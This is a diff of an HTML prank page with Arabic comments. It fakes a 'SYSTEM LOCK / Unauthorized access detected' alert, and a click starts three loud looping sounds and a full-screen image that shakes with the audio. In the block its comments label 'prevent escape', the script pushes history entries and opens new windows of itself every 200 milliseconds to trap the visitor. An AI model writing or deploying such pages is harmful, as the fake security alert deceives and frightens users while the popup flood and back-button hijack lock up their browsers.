@@ -3,97 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_HALT ☠️</title>
+    <title>☠️ SECURITY ALERT ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة تعمر الشاشة ومستعدة للهبال سواسوة */
-        #ghost { 
+        /* الصورة كبيرة تعمر الشاشة ومستعدة للهبال سواسوة */
+        #madImg { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 10; display: none;
             will-change: transform;
         }
 
-        /* الرسالة القديمة المريغلة سواسوة */
         #ui { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; z-index: 1000; display: flex; 
             flex-direction: column; justify-content: center; align-items: center;
-            font-family: 'Courier New', monospace; color: #f00; text-align: center;
+            font-family: monospace; color: #f00; text-align: center;
         }
-        .header { font-size: 32px; font-weight: bold; text-shadow: 0 0 15px #f00; }
-        .blink { animation: b 0.1s infinite; }
-        @keyframes b { 50% { opacity: 0; } }
         .btn { 
             background: #f00; color: #000; border: none; padding: 25px 60px; 
-            font-weight: bold; font-size: 24px; cursor: pointer; margin-top: 40px;
+            font-weight: bold; font-size: 24px; cursor: pointer; margin-top: 30px;
         }
     </style>
 </head>
-<body onclick="launchNightmare()">
+<body onclick="startMadness()">
 
     <div id="ui">
-        <h1 class="blink">☠️ SYSTEM_LOCK ☠️</h1>
-        <p>Illegal Entry Detected.<br>Tap to force terminate all processes.</p>
+        <h1 style="animation: blink 0.1s infinite;">☠️ SYSTEM LOCK ☠️</h1>
+        <p>Unauthorized access detected.<br>Click to terminate all processes.</p>
         <button class="btn">TERMINATE</button>
     </div>
 
-    <img id="ghost" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="sounds">
+    <div id="audioBox">
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
         <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
-        let ctx, analyzer, buffer;
-        const img = document.getElementById('ghost');
+        let aCtx, analyser, data;
+        const img = document.getElementById('madImg');
 
-        function launchNightmare() {
-            // 1. إطلاق الأصوات الـ 3 الجديدة فوراً سواسوة
+        function startMadness() {
+            // 1. إطلاق الأصوات الـ 3 سواسوة
             const audios = document.querySelectorAll('.t');
             audios.forEach(a => { a.volume = 1.0; a.play(); });
 
             document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
 
-            // 2. تفعيل محرك التخبيط البصري سواسوة
-            if (!ctx) {
-                ctx = new (window.AudioContext || window.webkitAudioContext)();
-                // نربط الحركة بصرخة الدجاجة و Dzonza سواسوة
-                const src = ctx.createMediaElementSource(audios[1]); 
-                analyzer = ctx.createAnalyser();
-                analyzer.fftSize = 64;
-                buffer = new Uint8Array(analyzer.frequencyBinCount);
-                src.connect(analyzer);
-                analyzer.connect(ctx.destination);
+            // 2. تفعيل محرك التخبيط (Jitter) سواسوة
+            if (!aCtx) {
+                aCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const source = aCtx.createMediaElementSource(audios[1]); // نربط الحركة بصرخة الدجاجة
+                analyser = aCtx.createAnalyser();
+                analyser.fftSize = 64;
+                data = new Uint8Array(analyser.frequencyBinCount);
+                source.connect(analyser);
+                analyser.connect(aCtx.destination);
                 
-                if (ctx.state === 'suspended') ctx.resume();
-                jitterAnimation();
+                if (aCtx.state === 'suspended') aCtx.resume();
+                loop();
             }
 
             // 3. منع الهروب سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 180);
+            }, 200);
         }
 
-        function jitterAnimation() {
-            analyzer.getByteFrequencyData(buffer);
-            let vol = buffer[0]; 
+        function loop() {
+            analyser.getByteFrequencyData(data);
+            let vol = data[0]; 
 
-            // 4. ميزة التخبيط: المرأة ترعش وتتخبط بقوة سواسوة
-            const power = (vol / 255) * 80; 
+            // 4. الحركة المطلوبة: المرأة ترعد وتتخبط بقوة سواسوة
+            const power = (vol / 255) * 90; 
             const x = (Math.random() - 0.5) * power * 6;
             const y = (Math.random() - 0.5) * power * 6;
             const r = (Math.random() - 0.5) * power;
-            const s = 1 + (vol / 255) * 0.55;
+            const s = 1 + (vol / 255) * 0.6;
 
             img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            requestAnimationFrame(jitterAnimation);
+            requestAnimationFrame(loop);
         }
     </script>
+    <style> @keyframes blink { 50% { opacity: 0; } } </style>
 </body>
 </html>
